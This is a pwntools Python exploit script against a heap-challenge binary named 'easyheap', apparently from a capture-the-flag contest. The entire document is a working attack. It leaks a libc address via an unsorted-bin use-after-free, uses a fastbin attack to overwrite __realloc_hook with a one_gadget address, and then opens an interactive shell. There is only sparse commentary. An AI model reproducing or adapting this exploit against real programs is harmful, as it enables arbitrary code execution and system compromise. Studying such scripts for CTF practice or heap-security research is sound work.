#!/usr/env/bin python3
from pwn import *

context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

def debug_on():
	if (DEBUG):
		context.log_level = "debug"
	
g_fname = "./easyheap"
g_elf = ELF(g_fname)
g_libcname = "./libc-2.23.so"
g_libc = ELF(g_libcname)

if (LOCAL):
	g_io = process(g_fname)
else:
	g_io = remote()

def getpid():
	if (LOCAL & DEBUG):
		log.info("pid: %d" % g_io.proc.pid)
		pause()
	
def opt(idx):
	g_io.sendlineafter("Your choice:", str(idx))	

def add(size, content):
	opt(1)
	g_io.sendlineafter("Input group size:", str(size))
	g_io.sendlineafter("Input group member:", content)

def show(idx):
	opt(2)
	g_io.sendlineafter("Input group index:", str(idx))
	
def change(idx, size, content):
	opt(3)
	g_io.sendlineafter("Input group index:", str(idx))
	g_io.sendlineafter("Input group name:", str(size))
	g_io.sendlineafter("Input group member:", content)

def remove(idx):
	opt(4)
	g_io.sendlineafter("Input group index:", str(idx))

def exit():
	opt(5)

def pwn():
	debug_on()
	# 1. unsorted bin to leak arena's address -> calculate base of glibc
	add(0x80, "aaa") # 0
	add(0x80, "bbb") # 1
	remove(0)

	show(0)
	g_io.recvuntil("0 : ")
	res = g_io.recvline()[:6]
	addr_arena = u64(res.ljust(8, b"\x00")) - 88
	log.success("addr_arena = %#x" % addr_arena)

	off_arena = 0x3c4b20
	libc_base = addr_arena - off_arena
	one_gadget = libc_base + 0x4527a # [rsp+0x30] == NULL  
	fake_chunk = libc_base + g_libc.symbols["__realloc_hook"] - 0x1b

	log.success("libc@%#x\none_gadget@%#x\nfake_chunk@%#x" % (libc_base, one_gadget, fake_chunk))
	remove(1)	

	# 2. fastbin attack: allocate to __realloc_hook, write one_gadget to it, then get shell
	add(0x60, "ccc") # 2
	add(0x60, "ddd") # 3
	remove(3)
	
	payload_fast_att = flat(['a'*0x60, 0x70, 0x71, fake_chunk])
	change(2, len(payload_fast_att) + 1, payload_fast_att)
	
	add(0x60, "eee") # 4

	adjust_stack = libc_base + g_libc.symbols["realloc"]# + 0xc 
	payload_hijack = flat(['a'*(0x1b-0x10), one_gadget, adjust_stack])
	add(0x60, payload_hijack)

	# trigger __malloc_hook
	getpid()
	opt(1)
	g_io.sendlineafter("Input group size:", str(0x60))	
if "__main__" == __name__:
	pwn()
	g_io.interactive()
